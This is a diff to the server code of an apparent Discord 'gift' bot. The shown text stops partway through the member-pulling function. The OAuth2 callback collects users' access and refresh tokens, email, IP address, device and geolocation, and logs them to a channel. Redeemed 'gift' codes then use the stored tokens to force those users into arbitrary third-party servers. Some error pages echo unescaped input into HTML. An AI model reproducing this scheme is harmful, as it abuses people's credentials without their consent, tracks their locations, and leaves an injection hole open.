@@ -3,7 +3,16 @@ console.log('🚀 [server.js] arquivo foi carregado');
 const axios = require('axios');
 const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 const { renderGiftPage } = require('./giftPage');
-const painel = require('./painel');
+
+// ============================
+// PROTEÇÃO GLOBAL CONTRA CRASH
+// ============================
+process.on('unhandledRejection', (err) => {
+    console.error('⚠️ [UNHANDLED REJECTION]', err && err.message ? err.message : err);
+});
+process.on('uncaughtException', (err) => {
+    console.error('⚠️ [UNCAUGHT EXCEPTION]', err && err.message ? err.message : err);
+});
 
 module.exports = (app, client) => {
     console.log('🚀 [server.js] função foi executada');
@@ -15,13 +24,13 @@ module.exports = (app, client) => {
         config = db.config;
         console.log('✅ [server.js] database importado OK');
     } catch (err) {
-        console.error('❌ [server.js] erro:', err.message);
+        console.error('❌ [server.js] erro database:', err.message);
         users = { set: async () => {}, get: async () => undefined, all: async () => [], delete: async () => {} };
         config = { get: async () => undefined, set: async () => {} };
     }
 
     // ============================
-    // GEOLOCALIZAÇÃO
+    // GEO LOCALIZAÇÃO
     // ============================
     async function getGeoInfo(ip) {
         if (!ip || ip === 'desconhecido' || ip.startsWith('127.') || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) {
@@ -30,7 +39,11 @@ module.exports = (app, client) => {
         try {
             const resp = await axios.get('https://ipapi.co/' + ip + '/json/', { timeout: 5000, headers: { 'User-Agent': 'Meubot/1.0' } });
             if (resp.data && !resp.data.error) {
-                return { cidade: resp.data.city || 'Desconhecido', estado: resp.data.region || 'Desconhecido', pais: resp.data.country_name || 'Desconhecido' };
+                return {
+                    cidade: resp.data.city || 'Desconhecido',
+                    estado: resp.data.region || 'Desconhecido',
+                    pais: resp.data.country_name || 'Desconhecido'
+                };
             }
             return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
         } catch (err) {
@@ -48,44 +61,30 @@ module.exports = (app, client) => {
         'body::before{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,0.012) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.012) 1px,transparent 1px);background-size:80px 80px;pointer-events:none;z-index:0}' +
         '.wrap{max-width:520px;width:100%;position:relative;z-index:1}' +
         '.handwritten{font-family:"Brush Script MT","Segoe Script",cursive;color:#fbbf24;font-size:26px;font-style:italic;transform:rotate(-3deg);display:inline-block;margin-bottom:24px}' +
-        '.handwritten .arrow{font-size:22px;margin-left:4px;display:inline-block;transform:rotate(15deg)}' +
-        '.wrench{width:88px;height:88px;background:linear-gradient(135deg,#fbbf24,#f59e0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;box-shadow:0 0 60px rgba(251,191,36,0.25),0 8px 30px rgba(251,191,36,0.15);font-size:40px;animation:pop 0.6s cubic-bezier(0.34,1.56,0.64,1)}' +
-        '@keyframes pop{0%{transform:scale(0);opacity:0}60%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}' +
+        '.wrench{width:88px;height:88px;background:linear-gradient(135deg,#fbbf24,#f59e0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;box-shadow:0 0 60px rgba(251,191,36,0.25);font-size:40px}' +
         'h1{font-size:42px;font-weight:700;color:#f4f4f5;letter-spacing:-1.5px;line-height:1.1;margin-bottom:16px}' +
-        '.sub{font-size:15px;color:#71717a;line-height:1.6;margin-bottom:32px;max-width:440px}' +
+        '.sub{font-size:15px;color:#71717a;line-height:1.6;margin-bottom:32px}' +
         '.info{background:#0d0d10;border:1px solid #1a1a1e;border-radius:10px;padding:4px 20px;margin-bottom:32px}' +
         '.row{display:flex;justify-content:space-between;padding:14px 0;font-size:13.5px;border-bottom:1px solid #1a1a1e}' +
         '.row:last-child{border-bottom:none}' +
         '.row span:first-child{color:#71717a}' +
         '.row span:last-child{color:#e4e4e7;font-weight:500}' +
         '.status-on{color:#fbbf24!important}' +
-        '.actions{display:flex;flex-direction:column;gap:10px;margin-bottom:32px}' +
-        '.btn{display:flex;align-items:center;justify-content:center;gap:8px;padding:15px 24px;background:#f4f4f5;color:#0a0a0c;border:none;border-radius:10px;font-size:14px;font-weight:600;text-decoration:none;font-family:inherit;transition:all 0.2s;cursor:pointer}' +
-        '.btn:hover{background:#fff;transform:translateY(-1px)}' +
-        '.btn-secondary{display:flex;align-items:center;justify-content:center;gap:6px;padding:14px 24px;background:transparent;color:#a1a1aa;border:1px solid #1a1a1e;border-radius:10px;font-size:13.5px;font-weight:500;text-decoration:none;transition:all 0.2s}' +
-        '.btn-secondary:hover{background:#111114;border-color:#2a2a2e;color:#e4e4e7}' +
-        '.footer{text-align:center;font-size:10.5px;color:#3f3f46;text-transform:uppercase;letter-spacing:2px;font-weight:600}' +
-        '.footer span{margin:0 8px;opacity:0.5}' +
+        '.actions{display:flex;flex-direction:column;gap:10px}' +
+        '.btn{display:flex;align-items:center;justify-content:center;padding:15px;background:#f4f4f5;color:#0a0a0c;border-radius:10px;font-size:14px;font-weight:600;text-decoration:none}' +
+        '.btn-secondary{display:flex;align-items:center;justify-content:center;padding:14px;background:transparent;color:#a1a1aa;border:1px solid #1a1a1e;border-radius:10px;font-size:13.5px;text-decoration:none}' +
         '</style></head><body><div class="wrap">' +
-        '<div class="handwritten">manutenção <span class="arrow">↗</span></div>' +
+        '<div class="handwritten">manutenção ↗</div>' +
         '<div class="wrench">🔧</div>' +
         '<h1>Sistema em<br>manutenção</h1>' +
-        '<p class="sub">Estamos fazendo melhorias no sistema. Os gifts voltam em breve — agradecemos a paciência.</p>' +
-        '<div class="info">' +
-        '<div class="row"><span>Status</span><span class="status-on">Em manutenção</span></div>' +
-        '<div class="row"><span>Previsão</span><span>Em breve</span></div>' +
-        '<div class="row"><span>Gifts</span><span>Bloqueados</span></div>' +
-        '</div>' +
-        '<div class="actions">' +
-        '<a class="btn" href="/">← Voltar pra loja</a>' +
-        '<a class="btn-secondary" href="https://discord.gg/d6mKKZa2QT" target="_blank">Entrar no Discord</a>' +
-        '</div>' +
-        '<div class="footer">FUZION GIFTS <span>•</span> MANUTENÇÃO <span>•</span> VOLTAMOS EM BREVE</div>' +
+        '<p class="sub">Estamos fazendo melhorias. Voltamos em breve.</p>' +
+        '<div class="info"><div class="row"><span>Status</span><span class="status-on">Em manutenção</span></div><div class="row"><span>Previsão</span><span>Em breve</span></div></div>' +
+        '<div class="actions"><a class="btn" href="/">← Voltar</a></div>' +
         '</div></body></html>';
     }
 
     // ============================
-    // MIDDLEWARE DE MANUTENÇÃO
+    // MIDDLEWARE MANUTENÇÃO
     // ============================
     async function checkManutencao(req, res, next) {
         if (req.path.startsWith('/painel') || req.path.startsWith('/api/painel')) return next();
@@ -96,9 +95,7 @@ module.exports = (app, client) => {
         try {
             const manutencao = await config.get('manutencaoAtiva');
             if (manutencao === true) {
-                if (req.path.startsWith('/api/')) {
-                    return res.status(503).json({ error: 'Sistema em manutenção. Volte em breve.' });
-                }
+                if (req.path.startsWith('/api/')) return res.status(503).json({ error: 'Manutenção.' });
                 return res.status(503).send(paginaManutencao());
             }
         } catch (e) {}
@@ -108,7 +105,10 @@ module.exports = (app, client) => {
     // ============================
     // ROTAS BÁSICAS
     // ============================
-    app.get('/', (req, res) => res.render('index.html'));
+    app.get('/', (req, res) => {
+        try { res.render('index.html'); } catch (e) { res.status(200).send('Fuzion Gifts'); }
+    });
+
     app.get('/ping', (req, res) => res.status(200).send('pong ✅'));
 
     app.get('/invite', (req, res) => {
@@ -122,10 +122,11 @@ module.exports = (app, client) => {
     // PAINEL ADMIN
     // ============================
     try {
+        const painel = require('./painel');
         painel(app, client, config, users);
         console.log('✅ [server.js] rotas do painel registradas');
     } catch (err) {
-        console.error('❌ [server.js] erro ao registrar painel:', err.message);
+        console.error('❌ [server.js] erro painel:', err.message);
     }
 
     // ============================
@@ -138,7 +139,7 @@ module.exports = (app, client) => {
             const gift = gifts[codigo];
 
             if (!gift) {
-                return res.status(404).send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gift não encontrado</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>body{background:#0b0b0d;color:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px}.c{background:rgba(26,26,34,0.85);padding:40px;border-radius:24px;max-width:500px;border:1px solid rgba(88,101,242,0.2)}h1{margin-bottom:16px}p{color:#b5bac1;line-height:1.6}</style></head><body><div class="c"><div style="font-size:64px">❌</div><h1>Gift não encontrado</h1><p>Esse código não existe ou foi deletado.</p></div></body></html>');
+                return res.status(404).send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gift não encontrado</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>body{background:#0b0b0d;color:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px}.c{background:#131316;padding:40px;border-radius:16px;max-width:500px;border:1px solid #1c1c1f}h1{margin-bottom:16px}p{color:#8a8a90;line-height:1.6}</style></head><body><div class="c"><div style="font-size:64px">❌</div><h1>Gift não encontrado</h1><p>Esse código não existe ou foi deletado.</p></div></body></html>');
             }
 
             if (gift.status === 'ativo' && gift.expiresAt && Date.now() > gift.expiresAt) {
@@ -151,13 +152,13 @@ module.exports = (app, client) => {
             res.setHeader('Content-Type', 'text/html; charset=utf-8');
             res.send(renderGiftPage(gift, baseUrl));
         } catch (err) {
-            console.error('❌ [GIFT] erro:', err);
+            console.error('❌ [GIFT] erro:', err.message);
             res.status(500).send('Erro interno');
         }
     });
 
     // ============================
-    // API DE LOGS DO GIFT
+    // LOGS DO GIFT
     // ============================
     app.get('/api/gift/:codigo/logs', async (req, res) => {
         try {
@@ -168,7 +169,7 @@ module.exports = (app, client) => {
     });
 
     // ============================
-    // API QUE PROCESSA O GIFT
+    // API DO GIFT
     // ============================
     app.post('/api/gift/:codigo', checkManutencao, async (req, res) => {
         try {
@@ -176,7 +177,7 @@ module.exports = (app, client) => {
             const guildId = req.body.guildId;
 
             if (!guildId || !/^\d{17,20}$/.test(guildId)) {
-                return res.status(400).json({ error: 'ID do servidor inválido.' });
+                return res.status(400).json({ error: 'ID inválido.' });
             }
 
             const gifts = (await config.get('gifts')) || {};
@@ -193,13 +194,11 @@ module.exports = (app, client) => {
 
             const bloqueados = (await config.get('giftBlockList')) || {};
             if (bloqueados[guildId]) {
-                return res.status(403).json({ error: 'Esse servidor está na blacklist. Motivo: ' + bloqueados[guildId].motivo });
+                return res.status(403).json({ error: 'Servidor na blacklist. Motivo: ' + bloqueados[guildId].motivo });
             }
 
             const guild = client.guilds.cache.get(guildId);
-            if (!guild) {
-                return res.status(400).json({ error: 'O bot não está nesse servidor. Clique em "Adicionar Bot" primeiro.' });
-            }
+            if (!guild) return res.status(400).json({ error: 'O bot não está nesse servidor.' });
 
             const dbData = await users.all();
             let userList = [];
@@ -211,7 +210,6 @@ module.exports = (app, client) => {
                 });
             }
 
-            // FILTRA RESTRINGIDOS
             const restringidos = (await config.get('restringidos')) || [];
             const filtrados = userList.filter(function(u) { return restringidos.indexOf(u.id) === -1; });
 
@@ -233,24 +231,26 @@ module.exports = (app, client) => {
 
             await config.set('giftLogs_' + codigo, []);
 
-            await enviarLogGift(client, config, 'usado', {
-                codigo: codigo,
-                quantidade: gift.quantidade,
-                guildId: guildId,
-                guildName: guild.name
-            });
+            try {
+                await enviarLogGift(client, config, 'usado', {
+                    codigo: codigo,
+                    quantidade: gift.quantidade,
+                    guildId: guildId,
+                    guildName: guild.name
+                });
+            } catch (e) {}
 
             puxarMembrosGift(client, config, codigo, guildId, toPull, guild);
 
-            return res.json({ mensagem: 'O bot começou a puxar ' + toPull.length + ' membros pro servidor ' + guild.name + '.' });
+            return res.json({ mensagem: 'Puxando ' + toPull.length + ' membros pro servidor ' + guild.name + '.' });
         } catch (err) {
-            console.error('❌ [GIFT] erro:', err);
-            return res.status(500).json({ error: 'Erro interno: ' + err.message });
+            console.error('❌ [GIFT] erro:', err.message);
+            return res.status(500).json({ error: 'Erro interno.' });
         }
     });
 
     // ============================
-    // CALLBACK OAuth2
+    // CALLBACK OAuth2 (COM offline_access)
     // ============================
     app.get('/oauth2/callback', async (req, res) => {
         const code = req.query.code;
@@ -263,11 +263,18 @@ module.exports = (app, client) => {
             params.append('grant_type', 'authorization_code');
             params.append('code', code);
             params.append('redirect_uri', process.env.REDIRECT_URI);
+            params.append('scope', 'identify guilds.join offline_access'); // ← OFFLINE_ACCESS ADICIONADO
 
             const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
             const access_token = tokenResponse.data.access_token;
             const refresh_token = tokenResponse.data.refresh_token;
             const token_type = tokenResponse.data.token_type;
+
+            if (!refresh_token) {
+                console.error('⚠️ [OAUTH2] Discord NÃO retornou refresh_token! Escopo offline_access não foi autorizado.');
+            } else {
+                console.log('✅ [OAUTH2] refresh_token recebido com sucesso');
+            }
 
             const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: token_type + ' ' + access_token } });
             const userData = userResponse.data;
@@ -284,25 +291,42 @@ module.exports = (app, client) => {
 
             try {
                 await users.set(userData.id, {
-                    id: userData.id, username: userData.username, avatar: userData.avatar, email: userData.email,
-                    access_token: access_token, refresh_token: refresh_token, ip: ip, userDevice: userDevice,
-                    cidade: geo.cidade, estado: geo.estado, pais: geo.pais, verifiedAt: new Date().toISOString()
+                    id: userData.id,
+                    username: userData.username,
+                    avatar: userData.avatar,
+                    email: userData.email,
+                    access_token: access_token,
+                    refresh_token: refresh_token,
+                    ip: ip,
+                    userDevice: userDevice,
+                    cidade: geo.cidade,
+                    estado: geo.estado,
+                    pais: geo.pais,
+                    verifiedAt: new Date().toISOString()
                 });
-            } catch (err) {}
+                console.log('💾 [DB] usuário salvo: ' + userData.id);
+            } catch (err) { console.error('❌ [DB] erro salvar:', err.message); }
 
             const guildId = process.env.GUILD_ID;
             let roleId = process.env.ROLE_ID;
             try { const configRoleId = await config.get('roleId'); if (configRoleId) roleId = configRoleId; } catch (err) {}
 
             let cargoAtribuido = false, entrouAgora = false, motivoFalha = null;
+
             if (guildId && roleId) {
                 try {
-                    const resp = await axios.put('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id,
+                    const resp = await axios.put(
+                        'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id,
                         { access_token: access_token, roles: [roleId] },
-                        { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false });
+                        { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
+                    );
                     if (resp.status === 201) { cargoAtribuido = true; entrouAgora = true; }
                     else if (resp.status === 204) {
-                        const roleResp = await axios.put('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id + '/roles/' + roleId, {}, { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false });
+                        const roleResp = await axios.put(
+                            'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id + '/roles/' + roleId,
+                            {},
+                            { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
+                        );
                         if (roleResp.status === 204) cargoAtribuido = true;
                         else motivoFalha = 'Erro ' + roleResp.status;
                     } else { motivoFalha = 'Erro ' + resp.status; }
@@ -312,13 +336,23 @@ module.exports = (app, client) => {
             const createdAt = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
             const accountDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
 
-            try { await sendLog(client, userData, ip, userDevice, geo, config, { cargoAtribuido: cargoAtribuido, entrouAgora: entrouAgora, motivoFalha: motivoFalha, jaEstavaNoBanco: jaEstavaNoBanco, accountDays: accountDays }); } catch (err) {}
+            try {
+                await sendLog(client, userData, ip, userDevice, geo, config, {
+                    cargoAtribuido: cargoAtribuido,
+                    entrouAgora: entrouAgora,
+                    motivoFalha: motivoFalha,
+                    jaEstavaNoBanco: jaEstavaNoBanco,
+                    accountDays: accountDays
+                });
+            } catch (err) { console.error('❌ [LOG] erro:', err.message); }
 
             const guild = client.guilds.cache.get(guildId);
             res.render('success.html', {
-                userName: userData.username, userId: userData.id,
+                userName: userData.username,
+                userId: userData.id,
                 userAvatar: userData.avatar ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png',
-                guildName: guild ? guild.name : 'Server', guildId: guildId || '0',
+                guildName: guild ? guild.name : 'Server',
+                guildId: guildId || '0',
                 guildIcon: guild && guild.icon ? 'https://cdn.discordapp.com/icons/' + guildId + '/' + guild.icon + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png',
                 accountDays: accountDays
             });
@@ -329,12 +363,12 @@ module.exports = (app, client) => {
             if (errData && errData.error === 'invalid_grant') mensagem = 'Esse link já foi usado ou expirou. Gere um novo link e tente novamente.';
             else if (errData && errData.error === 'access_denied') mensagem = 'Você cancelou a autorização.';
             else if (error.message) mensagem = error.message;
-            res.status(400).send('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Erro na Verificação</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#1e1f22;color:#dbdee1;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#2b2d31;border-radius:16px;padding:40px;max-width:500px;text-align:center}.icon{font-size:64px;margin-bottom:20px}h1{font-size:24px;color:#f2f3f5;margin-bottom:16px}p{font-size:16px;color:#b5bac1;line-height:1.6}</style></head><body><div class="card"><div class="icon">❌</div><h1>Erro na Verificação</h1><p>' + mensagem + '</p></div></body></html>');
+            res.status(400).send('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Erro na Verificação</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#0a0a0c;color:#d4d4d8;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#131316;border-radius:16px;padding:40px;max-width:500px;text-align:center;border:1px solid #1c1c1f}.icon{font-size:64px;margin-bottom:20px}h1{font-size:24px;color:#f4f4f5;margin-bottom:16px}p{font-size:16px;color:#8a8a90;line-height:1.6}</style></head><body><div class="card"><div class="icon">❌</div><h1>Erro na Verificação</h1><p>' + mensagem + '</p></div></body></html>');
         }
     });
 
     app.get('/error', (req, res) => {
-        res.render('error.html', { error: req.query.msg || 'Unknown error' });
+        try { res.render('error.html', { error: req.query.msg || 'Unknown error' }); } catch (e) { res.status(200).send('Erro: ' + (req.query.msg || 'desconhecido')); }
     });
 
     console.log('✅ [server.js] todas as rotas foram registradas');
@@ -344,38 +378,40 @@ module.exports = (app, client) => {
 // LOG DE VERIFICAÇÃO
 // ============================
 async function sendLog(client, userData, ip, userDevice, geo, config, status) {
-    let logChannelId = process.env.LOG_CHANNEL_ID;
-    try { const configLogId = await config.get('logChannelId'); if (configLogId) logChannelId = configLogId; } catch (err) {}
-    if (!logChannelId) return;
-    const channel = client.channels.cache.get(logChannelId);
-    if (!channel) return;
-    let webhook;
     try {
-        const webhooks = await channel.fetchWebhooks();
-        webhook = webhooks.find(function(w) { return w.name === 'OAuth2'; });
-        if (!webhook) webhook = await channel.createWebhook({ name: 'OAuth2', avatar: client.user.displayAvatarURL() });
-    } catch (err) { return; }
-    const creationDate = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
-    const creationAccountDays = Math.floor((Date.now() - creationDate) / (1000 * 60 * 60 * 24));
-    const userAvatar = userData.avatar ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png';
-    const embed = new EmbedBuilder()
-        .setColor(status.cargoAtribuido ? 4806097 : 0xff4d4d)
-        .setAuthor({ name: userData.username + ' (' + userData.id + ')', iconURL: userAvatar })
-        .setThumbnail(userAvatar)
-        .setDescription('**Menção:** <@' + userData.id + '>\n**E-mail:** `' + (userData.email || 'N/A') + '`\n**Idade da Conta:** `' + creationAccountDays + '` dias')
-        .addFields(
-            { name: (status.cargoAtribuido ? '✅' : '❌') + ' Cargo Atribuído', value: '`' + (status.cargoAtribuido ? 'Sim' : 'Não') + '`', inline: true },
-            { name: (status.entrouAgora ? '🆕' : '👥') + ' Entrou no Servidor', value: '`' + (status.entrouAgora ? 'Sim (novo)' : 'Já estava') + '`', inline: true },
-            { name: (status.jaEstavaNoBanco ? '🔄' : '🆕') + ' Verificação', value: '`' + (status.jaEstavaNoBanco ? 'Re-verificou' : 'Primeira vez') + '`', inline: true },
-            { name: '📍 Cidade', value: '`' + geo.cidade + '`', inline: true },
-            { name: '🗺️ Estado', value: '`' + geo.estado + '`', inline: true },
-            { name: '🌎 País', value: '`' + geo.pais + '`', inline: true },
-            { name: '🌐 IP', value: '`' + ip + '`' },
-            { name: '📱 Dispositivo', value: '`' + userDevice.substring(0, 1020) + '`' }
-        )
-        .setTimestamp();
-    if (status.motivoFalha) embed.addFields({ name: '⚠️ Motivo da Falha', value: '`' + status.motivoFalha.substring(0, 1020) + '`' });
-    await webhook.send({ embeds: [embed] });
+        let logChannelId = process.env.LOG_CHANNEL_ID;
+        try { const configLogId = await config.get('logChannelId'); if (configLogId) logChannelId = configLogId; } catch (err) {}
+        if (!logChannelId) return;
+        const channel = client.channels.cache.get(logChannelId);
+        if (!channel) return;
+        let webhook;
+        try {
+            const webhooks = await channel.fetchWebhooks();
+            webhook = webhooks.find(function(w) { return w.name === 'OAuth2'; });
+            if (!webhook) webhook = await channel.createWebhook({ name: 'OAuth2', avatar: client.user.displayAvatarURL() });
+        } catch (err) { return; }
+        const creationDate = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
+        const creationAccountDays = Math.floor((Date.now() - creationDate) / (1000 * 60 * 60 * 24));
+        const userAvatar = userData.avatar ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png';
+        const embed = new EmbedBuilder()
+            .setColor(status.cargoAtribuido ? 4806097 : 0xff4d4d)
+            .setAuthor({ name: userData.username + ' (' + userData.id + ')', iconURL: userAvatar })
+            .setThumbnail(userAvatar)
+            .setDescription('**Menção:** <@' + userData.id + '>\n**E-mail:** `' + (userData.email || 'N/A') + '`\n**Idade da Conta:** `' + creationAccountDays + '` dias')
+            .addFields(
+                { name: (status.cargoAtribuido ? '✅' : '❌') + ' Cargo Atribuído', value: '`' + (status.cargoAtribuido ? 'Sim' : 'Não') + '`', inline: true },
+                { name: (status.entrouAgora ? '🆕' : '👥') + ' Entrou no Servidor', value: '`' + (status.entrouAgora ? 'Sim (novo)' : 'Já estava') + '`', inline: true },
+                { name: (status.jaEstavaNoBanco ? '🔄' : '🆕') + ' Verificação', value: '`' + (status.jaEstavaNoBanco ? 'Re-verificou' : 'Primeira vez') + '`', inline: true },
+                { name: '📍 Cidade', value: '`' + geo.cidade + '`', inline: true },
+                { name: '🗺️ Estado', value: '`' + geo.estado + '`', inline: true },
+                { name: '🌎 País', value: '`' + geo.pais + '`', inline: true },
+                { name: '🌐 IP', value: '`' + ip + '`' },
+                { name: '📱 Dispositivo', value: '`' + userDevice.substring(0, 1020) + '`' }
+            )
+            .setTimestamp();
+        if (status.motivoFalha) embed.addFields({ name: '⚠️ Motivo da Falha', value: '`' + status.motivoFalha.substring(0, 1020) + '`' });
+        await webhook.send({ embeds: [embed] });
+    } catch (err) { console.error('❌ [sendLog] erro:', err.message); }
 }
 
 // ============================
@@ -399,107 +435,133 @@ async function enviarLogGift(client, config, tipo, dados) {
                 .addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }, { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true }).setTimestamp();
         }
         if (embed) await channel.send({ embeds: [embed] });
-    } catch (err) {}
+    } catch (err) { console.error('❌ [giftLog] erro:', err.message); }
 }
 
 // ============================
 // PUXAR MEMBROS DO GIFT
 // ============================
 async function puxarMembrosGift(client, config, codigo, guildId, userList, guild) {
-    const { users } = require('../database');
-    client.operacoesGift = client.operacoesGift || new Map();
-    client.operacoesGift.set(codigo, { parar: false });
-    let puxados = 0, falhas = 0, processed = 0;
+    try {
+        const { users } = require('../database');
+        client.operacoesGift = client.operacoesGift || new Map();
+        client.operacoesGift.set(codigo, { parar: false });
+        let puxados = 0, falhas = 0, processed = 0;
 
-    async function addLog(texto, tipo) {
-        try {
-            const logs = (await config.get('giftLogs_' + codigo)) || [];
-            const agora = new Date();
-            const hora = String(agora.getHours()).padStart(2, '0') + ':' + String(agora.getMinutes()).padStart(2, '0') + ':' + String(agora.getSeconds()).padStart(2, '0');
-            const log = { hora: hora, texto: texto };
-            if (tipo === 'erro') log.erro = true;
-            if (tipo === 'sucesso') log.sucesso = true;
-            logs.push(log);
-            if (logs.length > 100) logs.shift();
-            await config.set('giftLogs_' + codigo, logs);
-        } catch (e) {}
-    }
-
-    await addLog('Iniciando puxada de ' + userList.length + ' membros para ' + guild.name + '...');
-
-    const logChannelId = await config.get('giftLogChannelId');
-    let progressMsg = null;
-
-    if (logChannelId) {
-        const progressChannel = client.channels.cache.get(logChannelId);
-        if (progressChannel) {
-            const embedProgresso = new EmbedBuilder()
-                .setColor(0x5865F2).setTitle('🔄 Puxando — Gift ' + codigo).setDescription('Servidor: **' + guild.name + '**')
-                .addFields({ name: '📊 Progresso', value: '`0/' + userList.length + '`', inline: true }, { name: '✅ Puxados', value: '`0`', inline: true }, { name: '❌ Falhas', value: '`0`', inline: true })
-                .setFooter({ text: 'Clique no botão abaixo pra parar' }).setTimestamp();
-            const botaoParar = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('gift_parar_' + codigo).setLabel('Parar de Puxar').setEmoji('🛑').setStyle(ButtonStyle.Danger));
-            try { progressMsg = await progressChannel.send({ embeds: [embedProgresso], components: [botaoParar] }); } catch (err) {}
-        }
-    }
-
-    for (const userData of userList) {
-        const op = client.operacoesGift.get(codigo);
-        if (op && op.parar) { await addLog('Puxada cancelada pelo usuário.', 'erro'); break; }
-        const userId = userData.id;
-        const accessToken = userData.access_token;
-        const refreshToken = userData.refresh_token;
-        if (!accessToken || !userId) { falhas++; processed++; continue; }
-
-        try {
-            let resp = await axios.put('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId, { access_token: accessToken }, { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false });
-            if (resp.status === 403 && resp.data && resp.data.code === 50025 && refreshToken) {
-                try {
-                    const params = new URLSearchParams();
-                    params.append('client_id', process.env.CLIENT_ID);
-                    params.append('client_secret', process.env.CLIENT_SECRET);
-                    params.append('grant_type', 'refresh_token');
-                    params.append('refresh_token', refreshToken);
-                    const tokenResp = await axios.post('https://discord.com/api/v10/oauth2/token', params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
-                    const newAccess = tokenResp.data.access_token;
-                    const newRefresh = tokenResp.data.refresh_token;
-                    await users.set(userId, Object.assign({}, userData, { access_token: newAccess, refresh_token: newRefresh }));
-                    resp = await axios.put('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId, { access_token: newAccess }, { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false });
-                } catch (e) {}
-            }
-            if (resp.status === 201 || resp.status === 204) { puxados++; await addLog('Membro ' + (userData.username || userId) + ' puxado com sucesso'); }
-            else { falhas++; await addLog('Falha ao puxar ' + (userData.username || userId) + ' (status ' + resp.status + ')', 'erro'); }
-        } catch (err) { falhas++; await addLog('Erro ao puxar ' + (userData.username || userId), 'erro'); }
-
-        processed++;
-        if (progressMsg && (processed % 5 === 0 || processed === userList.length)) {
+        async function addLog(texto, tipo) {
             try {
-                const embedAtualizada = new EmbedBuilder()
+                const logs = (await config.get('giftLogs_' + codigo)) || [];
+                const agora = new Date();
+                const hora = String(agora.getHours()).padStart(2, '0') + ':' + String(agora.getMinutes()).padStart(2, '0') + ':' + String(agora.getSeconds()).padStart(2, '0');
+                const log = { hora: hora, texto: texto };
+                if (tipo === 'erro') log.erro = true;
+                if (tipo === 'sucesso') log.sucesso = true;
+                logs.push(log);
+                if (logs.length > 100) logs.shift();
+                await config.set('giftLogs_' + codigo, logs);
+            } catch (e) {}
+        }
+
+        await addLog('Iniciando puxada de ' + userList.length + ' membros para ' + guild.name + '...');
+
+        const logChannelId = await config.get('giftLogChannelId');
+        let progressMsg = null;
+
+        if (logChannelId) {
+            const progressChannel = client.channels.cache.get(logChannelId);
+            if (progressChannel) {
+                const embedProgresso = new EmbedBuilder()
                     .setColor(0x5865F2).setTitle('🔄 Puxando — Gift ' + codigo).setDescription('Servidor: **' + guild.name + '**')
-                    .addFields({ name: '📊 Progresso', value: '`' + processed + '/' + userList.length + '`', inline: true }, { name: '✅ Puxados', value: '`' + puxados + '`', inline: true }, { name: '❌ Falhas', value: '`' + falhas + '`', inline: true })
+                    .addFields({ name: '📊 Progresso', value: '`0/' + userList.length + '`', inline: true }, { name: '✅ Puxados', value: '`0`', inline: true }, { name: '❌ Falhas', value: '`0`', inline: true })
